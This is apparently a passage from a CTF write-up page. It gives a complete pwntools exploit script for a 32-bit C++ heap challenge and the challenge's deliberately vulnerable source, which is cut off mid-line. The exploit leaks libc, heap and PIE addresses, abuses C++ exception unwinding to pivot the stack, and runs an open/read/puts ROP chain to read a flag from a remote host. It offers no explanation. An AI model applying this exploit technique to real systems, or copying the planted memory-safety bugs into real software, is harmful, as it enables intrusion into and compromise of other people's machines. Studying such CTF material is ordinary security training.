<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;223.112.5.156&quot;</span>, <span class="number">51006</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.sendafter(<span class="string">&quot;Please input your choice &gt;&gt; &quot;</span>, <span class="built_in">str</span>(choice) + <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">typ, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Which type do you want to create?\n&quot;</span>, <span class="built_in">str</span>(typ) + <span class="string">&quot; &quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Please enter the content &gt;&gt; &quot;</span>, content + <span class="string">b&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Which one do you want to update?\n&quot;</span>, <span class="built_in">str</span>(idx) + <span class="string">&quot; &quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Please enter the new content &gt;&gt; &quot;</span>, content + <span class="string">b&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;Which one do you want to display?\n&quot;</span>, <span class="built_in">str</span>(idx) + <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, p32(<span class="number">0xdeadbeaf</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) :</span><br><span class="line">  add(<span class="number">0</span>, p32(<span class="number">0xffffffff</span>)*<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>) :</span><br><span class="line">  edit(i+<span class="number">1</span>, p32(<span class="number">0xffffffff</span>))</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xdeadbeaf</span>)*<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0</span>, p32(<span class="number">0xdeadbeaf</span>))</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0x111111</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u32(io.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:]) - <span class="number">0x40</span></span><br><span class="line">libc_base = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x18</span>)</span><br><span class="line">success(<span class="string">&quot;libc_base:\t&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xfffffff6</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>] + <span class="number">0x11</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u32(io.recv(<span class="number">3</span>).rjust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x22000</span> + <span class="number">0x8</span></span><br><span class="line">success(<span class="string">&quot;heap_base:\t&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xfffffff6</span>) + p32(heap_base + <span class="number">0x4ba8</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">pie_base = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x4e0c</span></span><br><span class="line">success(<span class="string">&quot;pie_base:\t&quot;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_ebp_ret = libc_base + <span class="number">0x1a973</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x110226</span></span><br><span class="line">unwind_ret = pie_base + <span class="number">0x2044</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\xff\xff\xff&#x27;</span> + p32(<span class="number">0xffffffff</span>)*<span class="number">4</span> + p32(heap_base + <span class="number">0x4cd1</span>) + p32(<span class="number">0xffffffff</span>)*<span class="number">2</span> + p32(heap_base + <span class="number">0x4c60</span>) + p32(<span class="number">0xffffffff</span>)*<span class="number">2</span> + p32(heap_base + <span class="number">0x4ca3</span> - <span class="number">0x1c</span>)</span><br><span class="line">payload += p32(heap_base + <span class="number">0x4c97</span> - <span class="number">4</span>) + p32(unwind_ret)</span><br><span class="line">payload += p32(libc_base + libc.sym[<span class="string">&#x27;gets&#x27;</span>]) + p32(pop_ebp_ret) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p32(leave_ret)</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xffffffff</span>) + payload)</span><br><span class="line">edit(<span class="number">0</span>, p32(<span class="number">0xffffffff</span>) + p32(heap_base + <span class="number">0x4c60</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_esp_8_ret = libc_base + <span class="number">0x2fbe9</span></span><br><span class="line">add_esp_c_ret = libc_base + <span class="number">0x83d12</span></span><br><span class="line"></span><br><span class="line">orw_rop = <span class="string">b&#x27;\xff\xff\xff&#x27;</span> + p32(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]) + p32(add_esp_8_ret) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x34</span>) + p32(<span class="number">0</span>)</span><br><span class="line">orw_rop += p32(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(add_esp_c_ret) + p32(<span class="number">3</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x100</span>) + p32(<span class="number">0x50</span>)</span><br><span class="line">orw_rop += p32(libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0xdeadbeaf</span>) + p32(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x100</span>) + <span class="string">b&#x27;./flag\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(orw_rop)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// g++ -o pwn source.cpp -m32</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cxxabi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unwind.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">filter</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, <span class="number">4</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ, <span class="number">0x40000003</span>, <span class="number">0</span>, <span class="number">2</span>),</span><br><span class="line">    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, <span class="number">0</span>),</span><br><span class="line">    BPF_JUMP(BPF_JMP+BPF_JEQ, <span class="number">11</span>, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">    .len = (<span class="type">unsigned</span> <span class="type">short</span>)(<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>])),</span><br><span class="line">    .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; ▄████▄   ██░ ██  ▄▄▄       ▒█████  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;▒██▀ ▀█  ▓██░ ██▒▒████▄    ▒██▒  ██▒&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▒██░  ██▒&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▒██   ██░&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒░ ████▓▒░&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▒░▒░ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░  ░ ▒ ▒░ &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;░         ░  ░░ ░  ░   ▒   ░ ░ ░ ▒  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;░ ░       ░  ░  ░      ░  ░    ░ ░  &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;░                                   &quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  welcome();</span><br><span class="line">  alarm(<span class="number">0x20</span>);</span><br><span class="line">  filter();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_one</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> length;</span><br><span class="line">  <span class="type">void</span> *data;</span><br><span class="line">  </span><br><span class="line">  Class_one() &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  Class_one(<span class="type">char</span>* buf)</span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    this-&gt;data = strdup(buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Class_one()</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">char</span> *<span class="title function_">c_str</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span>*)data;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">char</span>* buf)</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;data);</span><br><span class="line">    this-&gt;data = strdup(buf);</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = size() + <span class="number">10</span>;</span><br><span class="line">    <span class="type">char</span> buf[this-&gt;length];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, c_str());</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buf) &gt; (this-&gt;length - <span class="number">1</span>)) throw <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; buf &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_kun</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span>* buf;</span><br><span class="line"></span><br><span class="line">  Class_kun(<span class="type">int</span> size, <span class="type">char</span>* buf)</span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;size = size;</span><br><span class="line">    this-&gt;buf = strdup(buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~Class_kun()</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(this-&gt;buf);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_two</span> :</span> public Class_one</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">  Class_two(<span class="type">char</span>* buf)</span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    this-&gt;data = new Class_kun(this-&gt;length, buf);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~Class_two()</span><br><span class="line">  &#123;</span><br><span class="line">    delete((Class_kun*)this-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *<span class="title function_">c_str</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> ((Class_kun*)this-&gt;data)-&gt;buf;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> ((Class_kun*)this-&gt;data)-&gt;size;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> <span class="title function_">update</span><span class="params">(<span class="type">char</span>* buf)</span></span><br><span class="line">  &#123;</span><br><span class="line">    this-&gt;length = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    ((Class_kun*)this-&gt;data)-&gt;buf = strdup(buf);</span><br><span class="line">    ((Class_kun*)this-&gt;data)-&gt;size = this-&gt;length;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line">Class_one *lst[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|******************|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|       MENU       |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    1. Create     |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    2. Update     |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    3. Display    |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|    4. Exit       |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;|******************|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please input your choice &gt;&gt; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (cnt &gt;= <span class="number">10</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No spare space.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Which type do you want to create?&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; type;</span><br><span class="line">  <span class="keyword">if</span> ((type != <span class="number">0</span>) &amp;&amp; (type != <span class="number">1</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] No such type.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">string</span> content;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please enter the content &gt;&gt; &quot;</span>;</span><br><span class="line">  <span class="built_in">cin</span> &gt;&gt; content;</span><br><span class="line">  <span class="keyword">if</span> (content.size() &gt;= <span class="number">0x100</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[Error] Content is too long.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (type == <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    lst[cnt] = new Class_two((<span class="type">char</span>*)content.c_str());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    lst[cnt] = new Class_one((<span class="type">char</span>*)content.c_str());</span><br><span class="line">  &#125;</span><br><span class="line">  cnt++;</span><br><span 